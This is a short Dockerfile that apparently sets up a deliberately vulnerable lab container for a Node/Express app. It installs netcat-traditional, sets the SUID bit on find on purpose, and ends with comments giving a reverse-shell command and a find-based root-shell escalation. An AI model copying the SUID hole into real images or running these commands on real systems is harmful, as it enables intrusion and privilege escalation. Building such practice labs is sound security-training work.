FROM node:18-slim

WORKDIR /app

RUN apt-get update && \
    apt-get install -y netcat-traditional findutils && \
    npm install -g npm && \
    npm install express body-parser && \
    chown -R www-data:www-data /app

COPY app.js . 
COPY public ./public

RUN chmod u+s /usr/bin/find

USER www-data

EXPOSE 5000
CMD ["node", "app.js"]


#Notes: Reverse shell: nc "ip" "port" -e /bin/sh
#Priv Esc: /usr/bin/find . -exec /bin/sh -p \; -quit